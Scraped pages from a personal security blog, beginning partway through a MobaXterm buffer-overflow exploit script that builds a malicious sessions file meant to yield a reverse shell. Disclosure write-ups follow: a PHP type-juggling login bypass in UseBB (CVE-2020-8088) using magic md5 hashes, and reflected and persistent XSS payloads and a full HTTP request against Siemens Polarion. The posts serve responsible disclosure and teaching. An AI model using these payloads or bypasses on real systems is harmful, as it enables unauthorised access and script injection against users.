f = open( 'pwnd.mxtsessions', 'w' )
f.write(sessions_file)
f.close()

print ("[+] Malicious file created.")
print ("[+] Import the sessions in MobaXterm and wait for the reverse shell! :)")
```

You can find it also in Exploit-DB:

<https://www.exploit-db.com/exploits/47429>

And that‚Äôs all for this blog entry, I hope you liked it!

---

## Disclosure Process

* 01/09/2019 ‚Äì Reported vulnerability to Mobatek
* 02/09/2019 ‚Äì Update from Mobatek that security fix would beadded in the version 12.2
* 17/09/2019 ‚Äì Mobatek published the version 12.2 that fixed the vulnerability

This entry was posted in [Exploiting](https://xavibel.com/category/exploiting/) and tagged [Assembly](https://xavibel.com/tag/assembly/), [Boofuzz](https://xavibel.com/tag/boofuzz/), [exploit development](https://xavibel.com/tag/exploit-development/), [Fuzzing](https://xavibel.com/tag/fuzzing/), [hacking](https://xavibel.com/tag/hacking/), [Mobatek](https://xavibel.com/tag/mobatek/), [MobaXterm](https://xavibel.com/tag/mobaxterm/), [OSCE](https://xavibel.com/tag/osce/), [OSCE exam](https://xavibel.com/tag/osce-exam/), [SEH](https://xavibel.com/tag/seh/), [shellcode](https://xavibel.com/tag/shellcode/), [x86](https://xavibel.com/tag/x86/). Bookmark the [permalink](https://xavibel.com/2019/09/01/mobaxterm-buffer-overflow-malicious-sessions-file-import/ "Permalink to MobaXterm Buffer Overflow ‚Äì Malicious Sessions File import").

[‚Üê SEH based local Buffer Overflow ‚Äì DameWare Remote Support](https://xavibel.com/2019/08/31/seh-based-local-buffer-overflow-dameware-remote-support-v-12-1-0-34/)
[Siemens Polarion ‚Äì CVE-2019-13934, CVE-2019-13935, CVE-2019-13936 ‚Üí](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/)

### Leave a Reply [Cancel reply](/2019/09/01/mobaxterm-buffer-overflow-malicious-sessions-file-import/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

Œî

* Search for:
* ### Recent Posts

  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Death Note](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)
  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Pet Companion](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)
  + [Shellcode ‚Äì Windows/x86 ‚Äì Create Administrator User ‚Äì Dynamic PEB & EDT](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)
  + [Creating your own AMSI Bypass using Powershell Reflection Technique](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)
  + [Linux Shared Library Hijacking](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)
* ### Recent Comments

  + Xavi on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-9964)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5524)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5523)
  + Xavi on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2892)
  + junsec on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2863)
* ### Archives

  + [March 2024](https://xavibel.com/2024/03/)
  + [January 2023](https://xavibel.com/2023/01/)
  + [November 2022](https://xavibel.com/2022/11/)
  + [September 2022](https://xavibel.com/2022/09/)
  + [November 2020](https://xavibel.com/2020/11/)
  + [October 2020](https://xavibel.com/2020/10/)
  + [March 2020](https://xavibel.com/2020/03/)
  + [January 2020](https://xavibel.com/2020/01/)
  + [November 2019](https://xavibel.com/2019/11/)
  + [September 2019](https://xavibel.com/2019/09/)
  + [August 2019](https://xavibel.com/2019/08/)
  + [July 2019](https://xavibel.com/2019/07/)
  + [June 2019](https://xavibel.com/2019/06/)
  + [May 2019](https://xavibel.com/2019/05/)
  + [April 2019](https://xavibel.com/2019/04/)
  + [March 2019](https://xavibel.com/2019/03/)
  + [February 2019](https://xavibel.com/2019/02/)
  + [October 2018](https://xavibel.com/2018/10/)
* ### Categories

  + [Exploiting](https://xavibel.com/category/exploiting/)
  + [Hacking Web](https://xavibel.com/category/hackingweb/)
  + [Miscellaneous](https://xavibel.com/category/miscellaneous/)
  + [Uncategorized](https://xavibel.com/category/uncategorized/)
* ### Meta

  + [Log in](https://xavibel.com/wp-login.php)
  + [Entries feed](https://xavibel.com/feed/)
  + [Comments feed](https://xavibel.com/comments/feed/)
  + [WordPress.org](https://wordpress.org/)

[Happy Hacking!](https://xavibel.com/)

[Proudly powered by WordPress.](https://wordpress.org/ "Semantic Personal Publishing Platform")



=== Content from xavibel.com_234d5d80_20250121_024231.html ===

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security
![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)
[Skip to content](#content)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

# Tag Archives: XSS

## [Siemens Polarion ‚Äì CVE-2019-13934, CVE-2019-13935, CVE-2019-13936](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/)

Posted on [November 25, 2019](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/ "2:29 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello, I write this blog post for people that is just starting in web application hacking. I recommend you that you just download some product or web application and start testing it. You are going to realize that sometimes is ‚Ä¶ [Continue reading ‚Üí](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/)

Posted in [Hacking Web](https://xavibel.com/category/hackingweb/)
|
Tagged [CVE](https://xavibel.com/tag/cve/), [Hacking web](https://xavibel.com/tag/hacking-web/), [persistent XSS](https://xavibel.com/tag/persistent-xss/), [vulnerability discovery](https://xavibel.com/tag/vulnerability-discovery/), [XSS](https://xavibel.com/tag/xss/)
|
[Leave a comment](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/#respond)

* Search for:
* ### Recent Posts

  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Death Note](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)
  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Pet Companion](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)
  + [Shellcode ‚Äì Windows/x86 ‚Äì Create Administrator User ‚Äì Dynamic PEB & EDT](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)
  + [Creating your own AMSI Bypass using Powershell Reflection Technique](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)
  + [Linux Shared Library Hijacking](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)
* ### Recent Comments

  + Xavi on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-9964)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5524)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5523)
  + Xavi on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2892)
  + junsec on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2863)
* ### Archives

  + [March 2024](https://xavibel.com/2024/03/)
  + [January 2023](https://xavibel.com/2023/01/)
  + [November 2022](https://xavibel.com/2022/11/)
  + [September 2022](https://xavibel.com/2022/09/)
  + [November 2020](https://xavibel.com/2020/11/)
  + [October 2020](https://xavibel.com/2020/10/)
  + [March 2020](https://xavibel.com/2020/03/)
  + [January 2020](https://xavibel.com/2020/01/)
  + [November 2019](https://xavibel.com/2019/11/)
  + [September 2019](https://xavibel.com/2019/09/)
  + [August 2019](https://xavibel.com/2019/08/)
  + [July 2019](https://xavibel.com/2019/07/)
  + [June 2019](https://xavibel.com/2019/06/)
  + [May 2019](https://xavibel.com/2019/05/)
  + [April 2019](https://xavibel.com/2019/04/)
  + [March 2019](https://xavibel.com/2019/03/)
  + [February 2019](https://xavibel.com/2019/02/)
  + [October 2018](https://xavibel.com/2018/10/)
* ### Categories

  + [Exploiting](https://xavibel.com/category/exploiting/)
  + [Hacking Web](https://xavibel.com/category/hackingweb/)
  + [Miscellaneous](https://xavibel.com/category/miscellaneous/)
  + [Uncategorized](https://xavibel.com/category/uncategorized/)
* ### Meta

  + [Log in](https://xavibel.com/wp-login.php)
  + [Entries feed](https://xavibel.com/feed/)
  + [Comments feed](https://xavibel.com/comments/feed/)
  + [WordPress.org](https://wordpress.org/)

[Happy Hacking!](https://xavibel.com/)

[Proudly powered by WordPress.](https://wordpress.org/ "Semantic Personal Publishing Platform")



=== Content from xavibel.com_e89d9602_20250121_024232.html ===

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security
![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)
[Skip to content](#content)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

[‚Üê Siemens Polarion ‚Äì CVE-2019-13934, CVE-2019-13935, CVE-2019-13936](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/)
[CVE-2020-10963 ‚Äì Unrestricted File Upload in FrozenNode/Laravel-Administrator ‚Üí](https://xavibel.com/2020/03/23/unrestricted-file-upload-in-frozennode-laravel-administrator/)

# CVE-2020-8088 ‚Äì UseBB Forum 1.0.12 ‚Äì PHP Type Juggling vulnerability

Posted on [January 22, 2020](https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/ "6:55 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello!

Last week I was reading about PHP Type Juggling vulnerabilities and I decided to spend a couple of days learning about them.

These vulnerabilities can happen during comparison of PHP variables, because PHP will automatically convert the data into a common comparable type.

My idea was to try to find one by my own. But first I needed to look for some PHP open source code to review.

I thought that I could find one in old open source forums. My idea was to try to understand the authentication and the password recovery implementations.

After installing a couple of different open source forums I‚Äôve found UseBB software that seemed to have an interesting implementation of the login.

## Installing the software and creating and admin user

So I installed the software, to do that I created a database and followed the installation steps.

I created an admin user with the following credentials:

```
username=admin
password=aabC9RqS
```
## Checking the login implementation

Doing a quick code check, I‚Äôve found that the login was implemented in the file: ‚Äú/sources/panel\_login.php‚Äù

[![](https://xavibel.com/wp-content/uploads/2020/01/code-review-1024x768.png)](https://xavibel.com/wp-content/uploads/2020/01/code-review-1024x768.png)

UseBB Forum Login implementation

## Identifying a vulnerability

The application does different checks to verify if the password supplied by the user is correct. The most important line for checking the Type Juggling vulnerability is the following:

if ( !$userdata[‚Äòid‚Äô] || **md5**(stripslashes($\_POST[‚Äòpasswd‚Äô])) **!=** $userdata[‚Äòpasswd‚Äô] ) {

Notice that it‚Äôs using only one equal sign, that is a loose comparison, and they should have used an strict one.

In this link you can read the following:

<https://www.whitehatsec.com/blog/magic-hashes/>

‚Äú*For more than the last decade, PHP programmers have been wrestling with the equals-equals (==) operator. It‚Äôs caused a lot of issues. This has a particular implication for password hashes. Password hashes in PHP are base16 encoded and can come in the form of ‚Äú0e812389‚Ä¶‚Äù. The problem is in == comparison the 0e means that if the following characters are all digits the whole string gets treated as a float.* ‚Äú

What they are talking about, is that when there is a loose comparison, you can do strange things, like this:

```
socket@lab:~$ php -r "print md5('aabC9RqS');";echo ''
0e041022518165728065344349536299
socket@lab:~$ php -r "print md5('aabg7XSs');";echo ''
0e087386482136013740957780965295
socket@lab:~$ php -r "var_dump(md5('aabC9RqS') == md5('aabg7XSs'));"
bool(true)
```

As you can see the hashes are different but when we compare them with a loose comparison the result is true.

## Login with the same user using a different password

Before doing anything, let‚Äôs check the current status of our database. Specifically the table usebb\_members that stores usernames and hashed passwords.

I see the following hash stored as the password:

![](https://xavibel.com/wp-content/uploads/2020/01/password-hash-2.png)

UseBB Forum admin password hash

If we remember the login verification, this hash is the value for the variable: $userdata[‚Äòpasswd‚Äô]

Doing a quick verification we can see that this hash, is the md5 value of the password that we used when we registered the user:

```
socket@lab:~$ php -r "print md5('aabC9RqS');";echo ''
0e041022518165728065344349536299
```

We know that the password for the user admin is: ‚ÄúaabC9RqS‚Äù but let‚Äôs try to use ‚Äúaabg7XSs‚Äù instead.

We try to login using this password:

![](https://xavibel.com/wp-content/uploads/2020/01/login-with-different-password.png)

The server is evaluating this:

```
md5('aabC9RqS') == md5('aabg7XSs')
0e041022518165728065344349536299 == 0e087386482136013740957780965295
```

And as we saw before‚Ä¶

```
php -r "var_dump(md5('aabC9RqS') == md5('aabg7XSs'));"
bool(true)
```

So, we are in üôÇ

![](https://xavibel.com/wp-content/uploads/2020/01/admin-login.png)
## Vulnerability solution:

We need to add an extra equal in the line 72 of sources/panel\_login.php

if ( !$userdata[‚Äòid‚Äô] || md5(stripslashes($\_POST[‚Äòpasswd‚Äô])) **!==** $userdata[‚Äòpasswd‚Äô] ) {

This software seems to doesn‚Äôt have support. But if you are using it, I recommend you to migrate it to Drupal using this plugin:

<https://www.drupal.org/project/usebb2drupal>

## Interesting resources:

If you are interested reading more about this topic I recommend you some resources:

<https://www.whitehatsec.com/blog/magic-hashes/>

<https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf>

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling>

Thank you for reading the blog! See you soon üôÇ

This entry was posted in [Hacking Web](https://xavibel.com/category/hackingweb/) and tagged [CVE](https://xavibel.com/tag/cve/), [forum](https://xavibel.com/tag/forum/), [Hacking web](https://xavibel.com/tag/hacking-web/), [php](https://xavibel.com/tag/php/), [type juggling](https://xavibel.com/tag/type-juggling/), [usebb](https://xavibel.com/tag/usebb/), [vulnerability discovery](https://xavibel.com/tag/vulnerability-discovery/). Bookmark the [permalink](https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/ "Permalink to CVE-2020-8088 ‚Äì UseBB Forum 1.0.12 ‚Äì PHP Type Juggling vulnerability").

[‚Üê Siemens Polarion ‚Äì CVE-2019-13934, CVE-2019-13935, CVE-2019-13936](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/)
[CVE-2020-10963 ‚Äì Unrestricted File Upload in FrozenNode/Laravel-Administrator ‚Üí](https://xavibel.com/2020/03/23/unrestricted-file-upload-in-frozennode-laravel-administrator/)

### Leave a Reply [Cancel reply](/2020/01/22/usebb-forum-php-type-juggling-vulnerability/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

Œî

* Search for:
* ### Recent Posts

  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Death Note](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)
  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Pet Companion](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)
  + [Shellcode ‚Äì Windows/x86 ‚Äì Create Administrator User ‚Äì Dynamic PEB & EDT](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)
  + [Creating your own AMSI Bypass using Powershell Reflection Technique](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)
  + [Linux Shared Library Hijacking](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)
* ### Recent Comments

  + Xavi on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-9964)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5524)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5523)
  + Xavi on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2892)
  + junsec on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2863)
* ### Archives

  + [March 2024](https://xavibel.com/2024/03/)
  + [January 2023](https://xavibel.com/2023/01/)
  + [November 2022](https://xavibel.com/2022/11/)
  + [September 2022](https://xavibel.com/2022/09/)
  + [November 2020](https://xavibel.com/2020/11/)
  + [October 2020](https://xavibel.com/2020/10/)
  + [March 2020](https://xavibel.com/2020/03/)
  + [January 2020](https://xavibel.com/2020/01/)
  + [November 2019](https://xavibel.com/2019/11/)
  + [September 2019](https://xavibel.com/2019/09/)
  + [August 2019](https://xavibel.com/2019/08/)
  + [July 2019](https://xavibel.com/2019/07/)
  + [June 2019](https://xavibel.com/2019/06/)
  + [May 2019](https://xavibel.com/2019/05/)
  + [April 2019](https://xavibel.com/2019/04/)
  + [March 2019](https://xavibel.com/2019/03/)
  + [February 2019](https://xavibel.com/2019/02/)
  + [October 2018](https://xavibel.com/2018/10/)
* ### Categories

  + [Exploiting](https://xavibel.com/category/exploiting/)
  + [Hacking Web](https://xavibel.com/category/hackingweb/)
  + [Miscellaneous](https://xavibel.com/category/miscellaneous/)
  + [Uncategorized](https://xavibel.com/category/uncategorized/)
* ### Meta

  + [Log in](https://xavibel.com/wp-login.php)
  + [Entries feed](https://xavibel.com/feed/)
  + [Comments feed](https://xavibel.com/comments/feed/)
  + [WordPress.org](https://wordpress.org/)

[Happy Hacking!](https://xavibel.com/)

[Proudly powered by WordPress.](https://wordpress.org/ "Semantic Personal Publishing Platform")



=== Content from xavibel.com_ec726533_20250121_024230.html ===

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security
![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)
[Skip to content](#content)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

[‚Üê MobaXterm Buffer Overflow ‚Äì Malicious Sessions File import](https://xavibel.com/2019/09/01/mobaxterm-buffer-overflow-malicious-sessions-file-import/)
[CVE-2020-8088 ‚Äì UseBB Forum 1.0.12 ‚Äì PHP Type Juggling vulnerability ‚Üí](https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/)

# Siemens Polarion ‚Äì CVE-2019-13934, CVE-2019-13935, CVE-2019-13936

Posted on [November 25, 2019](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/ "2:29 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello,

I write this blog post for people that is just starting in web application hacking. I recommend you that you just download some product or web application and start testing it.

You are going to realize that sometimes is quite simple to find some interesting vulnerabilities, and it‚Äôs also a good experience to report them to the product owner and help to make things a little bit more secure üôÇ

---

About 6 months ago I spent a couple of hours playing with a Siemens product named Polarion.

After a manual revision of some requests I discovered some web vulnerabilities and I reported them to their product CERT.

As the final step of the responsible disclosure, they explained me that to assign the CVE numbers, I should publish my findings.

That is the reason why I‚Äôm writing this blog post. So here I share with you the details:

---

## CVE-2019-13934 ‚Äì Siemens Subversion ‚Äì Reflected Cross Site Scripting

**Affected version:** Polarion Subversion webclient 1.7.14

**Product information:** https://polarion.plm.automation.siemens.com/products/svn/svn\_webclient

**Vulnerability details:** The vulnerability it‚Äôs located in the parameter¬†**filename**¬†inside the following POST request:

```
POST /polarion/svnwebclient/fileUpdateAction.jsp?url=file.txt HTTP/1.1
Host: <deleted>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://<deleted>/polarion/svnwebclient/fileUpdate.jsp?url=file.txt
Content-Type: multipart/form-data; boundary=---------------------------4696637554683464751235486069
Content-Length: 530
Cookie: DirectoryContentSortField=name; DirectoryContentSortOrder=asc; JSESSIONID=76067245193EEE051FF470E0C836BB4A.node1; JSESSIONID=4F7EA7035D551E38423431D72B270216.node1; JSESSIONIDSSO=755CF03DEAA3BF533239D2971F6A2AA0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------4696637554683464751235486069
Content-Disposition: form-data; name="originalname"

file.txt
-----------------------------4696637554683464751235486069
Content-Disposition: form-data; name="filepath"; filename="file.txt<img src=a onerror=alert('XSS-Validation')>"
Content-Type: text/plain

hello!

-----------------------------4696637554683464751235486069
Content-Disposition: form-data; name="comment"

File was updated remotely
-----------------------------4696637554683464751235486069--
```

And here you can see the response from the server:

```
HTTP/1.1 200 200
Date: Mon, 15 Jul 2019 13:47:47 GMT
Server: Apache/2.4.6 (Red Hat Enterprise Linux) OpenSSL/1.0.2k-fips SVN/1.7.14
Content-Type: text/html;charset=UTF-8
Content-Length: 7991
Connection: close

...
                <b>Message:</b>
            </td>
        </tr>
        <tr>
            <td>
                File file.txt<img src=a onerror=alert('XSS-Validation')> was successfully committed.
            </td>
        </tr>
        <tr>
            <td style="padding-top:10px;">
                <b>Changed elements:</b>
...
```

Here are some evidences:

![](https://xavibel.com/wp-content/uploads/2019/11/Apache-SVN-XSS-01-without-hostname-1024x837.png)
![](https://xavibel.com/wp-content/uploads/2019/11/Apache-SVN-XSS-02-without-hostname-1024x421.png)

---

## CVE-2019-13935 ‚Äì Siemens Polarion ‚Äì Reflected XSS

**Affected version:** Polarion Subversion webclient 1.7.14

**Product information:** https://polarion.plm.automation.siemens.com/products/svn/svn\_webclient

**Vulnerability details:** Visit the following url to trigger the XSS.

```
https://<DELETED>/polarion/svnwebclient/fileUpdate.jsp?url=file.txt%22%3E%3Cimg%20src=a%20onerror=alert(%27XSS-Validation%27)%3E
```

---

## CVE-2019-13936 ‚Äì Siemens Polarion ‚Äì Persistent Cross Site Scripting

**Affected version:** Polarion Subversion webclient 1.7.14

**Product information:** https://polarion.plm.automation.siemens.com/products/svn/svn\_webclient

**Vulnerability details:** Follow the next process to trigger the vulnerability.

Select:

**Wiki ‚Äì Create new¬† ‚Äì Info Page**

![](https://xavibel.com/wp-content/uploads/2019/11/persistent-xss-01-1.png)

And use this payload in the file title:

```
<svg/onload=‚Äùprompt(1)‚Äù>
```
![](https://xavibel.com/wp-content/uploads/2019/11/persistent-xss-02-1.png)

And here we can see the JavaScript code executed:

![](https://xavibel.com/wp-content/uploads/2019/11/image-1024x574.png)

---

I hope in a couple of weeks I can write a more interesting post related with a vulnerability named PHP Type Juggling.

See you soon!

This entry was posted in [Hacking Web](https://xavibel.com/category/hackingweb/) and tagged [CVE](https://xavibel.com/tag/cve/), [Hacking web](https://xavibel.com/tag/hacking-web/), [persistent XSS](https://xavibel.com/tag/persistent-xss/), [vulnerability discovery](https://xavibel.com/tag/vulnerability-discovery/), [XSS](https://xavibel.com/tag/xss/). Bookmark the [permalink](https://xavibel.com/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/ "Permalink to Siemens Polarion ‚Äì CVE-2019-13934, CVE-2019-13935, CVE-2019-13936").

[‚Üê MobaXterm Buffer Overflow ‚Äì Malicious Sessions File import](https://xavibel.com/2019/09/01/mobaxterm-buffer-overflow-malicious-sessions-file-import/)
[CVE-2020-8088 ‚Äì UseBB Forum 1.0.12 ‚Äì PHP Type Juggling vulnerability ‚Üí](https://xavibel.com/2020/01/22/usebb-forum-php-type-juggling-vulnerability/)

### Leave a Reply [Cancel reply](/2019/11/25/siemens-polarion-multiple-web-vulnerabilities/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

Œî

* Search for:
* ### Recent Posts

  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Death Note](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)
  + [CTF Binary Exploitation ‚Äì Cyber Apocalypse 2024: Hacker Royale ‚Äì Pet Companion](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)
  + [Shellcode ‚Äì Windows/x86 ‚Äì Create Administrator User ‚Äì Dynamic PEB & EDT](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)
  + [Creating your own AMSI Bypass using Powershell Reflection Technique](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)
  + [Linux Shared Library Hijacking](https://xavibel.com/2022/09/06/linux-shared-library-hijacking/)
* ### Recent Comments

  + Xavi on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-9964)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5524)
  + Merrell Vineza on [Exploit Development ‚Äì Vulnserver TRUN ‚Äì JMP EAX](https://xavibel.com/2019/06/24/exploit-development-vulnserver-trun-hard-way/#comment-5523)
  + Xavi on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2892)
  + junsec on [Shellcoding Linux x86 ‚Äì Bind Shell TCP ‚Äì Assignment 1](https://xavibel.com/2019/04/26/shellcoding-linux-x86-shell-bind-tcp/#comment-2863)
* ### Archives

  + [March 2024](https://xavibel.com/2024/03/)
  + [January 2023](https://xavibel.com/2023/01/)
  + [November 2022](https://xavibel.com/2022/11/)
  + [September 2022](https://xavibel.com/2022/09/)
  + [November 2020](https://xavibel.com/2020/11/)
  + [October 2020](https://xavibel.com/2020/10/)
  + [March 2020](https://xavibel.com/2020/03/)
  + [January 2020](https://xavibel.com/2020/01/)
  + [November 2019](https://xavibel.com/2019/11/)
  + [September 2019](https://xavibel.com/2019/09/)
  + [August 2019](https://xavibel.com/2019/08/)
  + [July 2019](https://xavibel.com/2019/07/)
  + [June 2019](https://xavibel.com/2019/06/)
  + [May 2019](https://xavibel.com/2019/05/)
  + [April 2019](https://xavibel.com/2019/04/)
  + [March 2019](https://xavibel.com/2019/03/)
  + [February 2019](https://xavibel.com/2019/02/)
  + [October 2018](https://xavibel.com/2018/10/)
* ### Categories

  + [Exploiting](https://xavibel.com/category/exploiting/)
  + [Hacking Web](https://xavibel.com/category/hackingweb/)
  + [Miscellaneous](https://xavibel.com/category/miscellaneous/)
  + [Uncategorized](https://xavibel.com/category/uncategorized/)
* ### Meta

  + [Log in](https://xavibel.com/wp-login.php)
  + [Entries feed](https://xavibel.com/feed/)
  + [Comments feed](https://xavibel.com/comments/feed/)
  + [WordPress.org](https://wordpress.org/)

[Happy Hacking!](https://xavibel.com/)

[Proudly powered by WordPress.](https://wordpress.org/ "Semantic Personal Publishing Platform")


